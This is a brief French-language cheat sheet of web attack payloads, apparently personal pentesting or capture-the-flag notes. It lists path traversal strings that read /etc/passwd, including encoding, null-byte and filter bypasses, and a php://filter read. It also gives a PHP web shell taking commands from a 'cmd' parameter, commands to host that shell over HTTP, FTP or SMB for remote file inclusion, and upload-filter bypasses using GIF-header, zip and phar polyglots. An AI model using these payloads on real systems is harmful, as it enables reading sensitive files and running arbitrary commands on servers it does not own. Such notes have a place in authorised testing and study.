# Path traversal

Bypass de base:

`=/etc/passwd`

`=../../../../../../etc/passwd`

`=....//....//....//....//....//....//....//etc/passwd`

`=....////....////....////....////....////etc/passwd`

`=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd (url encode)`

`=/gallery/../../../../../../../etc/passwd (en cas d'obligation de la présence d'un chemin approuvé dans l'url)`

`=../../../../etc/passwd%00 (null byte)`

PHP filters:

```url
php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

RFI:

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```shell-session
sudo python3 -m http.server <LISTENING_PORT>
```

```shell-session
sudo python -m pyftpdlib -p 21
```

```shell-session
impacket-smbserver -smb2support share $(pwd)
```

File uploads:

```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
à utiliser avec le wrapper "PHAR" de php:
=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
